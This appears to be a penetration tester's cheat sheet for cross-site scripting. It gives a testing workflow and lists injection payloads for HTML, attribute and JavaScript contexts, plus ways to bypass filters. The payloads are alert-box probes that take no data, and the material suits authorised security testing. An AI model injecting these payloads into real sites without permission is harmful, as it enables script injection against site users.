# Cross-Site Scripting (XSS)

## Test flow

1. Identify reflection points in query params, body params, headers, and stored fields.
2. Determine context: HTML, attribute, JavaScript, CSS, URL.
3. Probe with harmless markers first (for example: `XSSMARK123`).
4. Escalate with context-specific payloads.
5. Confirm execution in victim-like flow, not only your own session.

## Payload examples

### Basic probes

- `<script>alert(1)</script>`
- `"><script>alert(1)</script>`
- `'"/><svg/onload=alert(1)>`

### Attribute context

- `" onmouseover=alert(1) x="`
- `' autofocus onfocus=alert(1) x='`

### SVG/HTML event handlers

- `<svg onload=alert(1)>`
- `<img src=x onerror=alert(1)>`

### JavaScript context breaks

- `';alert(1);//`
- `";alert(1);//`
- `</script><script>alert(1)</script>`

### Filter bypass ideas

- Mixed case tags/events: `<sVg oNloAd=alert(1)>`
- Encodings: URL, HTML entities, double-encoding
- Alternate functions: `confirm(1)`, `prompt(1)`

## Notes

- Verify if CSP blocks execution and whether bypass is possible.
- Prioritize stored XSS and admin/user-to-user impact in reports.
